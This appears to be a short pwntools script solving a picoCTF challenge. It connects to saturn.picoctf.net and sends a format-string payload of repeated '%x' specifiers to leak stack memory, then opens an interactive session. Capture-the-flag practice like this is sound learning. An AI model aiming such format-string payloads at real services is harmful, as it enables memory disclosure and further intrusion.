from pwn import *

r = remote("saturn.picoctf.net", 62713)

payload = b"%x"*100
r.sendline(payload)

r.interactive()